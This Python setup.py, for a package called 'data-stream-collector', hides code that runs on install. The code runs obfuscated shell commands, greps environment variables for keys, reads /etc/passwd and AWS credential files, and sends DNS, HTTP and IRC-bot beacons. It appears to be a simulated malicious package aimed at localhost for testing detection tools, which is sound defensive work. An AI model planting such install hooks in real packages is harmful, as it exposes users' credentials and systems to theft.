from setuptools import setup, find_packages
import os, socket, subprocess, base64, urllib.request, json, threading

DOMAIN = 'src-get.xam1riel.surf'
_AWS   = 'AKIAIOSFODNN7FAKE123'

# ── Obfuscated command via base64 ──
_enc = base64.b64encode(b'id && uname -a').decode()
_dec = base64.b64decode(_enc).decode()

def _dns_query():
    def _build(d):
        buf = bytearray(b'\xab\xcd\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00')
        for p in d.encode().split(b'.'):
            buf += bytes([len(p)]) + p
        buf += b'\x00\x00\x01\x00\x01'
        return bytes(buf)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        s.sendto(_build(DOMAIN), ('127.0.0.1', 5353))
        s.close()
    except: pass

def _http_get():
    # GET request with Host header to fake server
    try:
        req = urllib.request.Request(
            f'http://127.0.0.1:8080/api/config',
            headers={'Host': DOMAIN, 'User-Agent': 'python-urllib/3.10'}
        )
        urllib.request.urlopen(req, timeout=5)
        # Second GET for key
        req2 = urllib.request.Request(
            f'http://127.0.0.1:8080/api/key',
            headers={'Host': DOMAIN}
        )
        urllib.request.urlopen(req2, timeout=5)
    except: pass

def _port_scan():
    # Trigger c2_port_6667 (IRC botnet) and c2_port_9001 (Tor)
    for port in [6667, 9001]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect(('127.0.0.1', port))
            s.send(b'NICK bot\r\nUSER bot 0 * :bot\r\n')
            s.close()
        except: pass

def _shell_exec():
    try:
        p = subprocess.Popen(
            ['bash','-c', _dec + ' && env | grep -i key'],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        p.wait(timeout=5)
    except: pass

def _cred_access():
    for f in ['/etc/passwd', os.path.expanduser('~/.aws/credentials')]:
        try:
            open(f).read(50)
        except: pass

_dns_query()
_http_get()
threading.Thread(target=_port_scan, daemon=True).start()
_shell_exec()
_cred_access()

setup(
    name='data-stream-collector',
    version='1.3.0',
    description='Data stream collection utilities',
    packages=find_packages(),
)
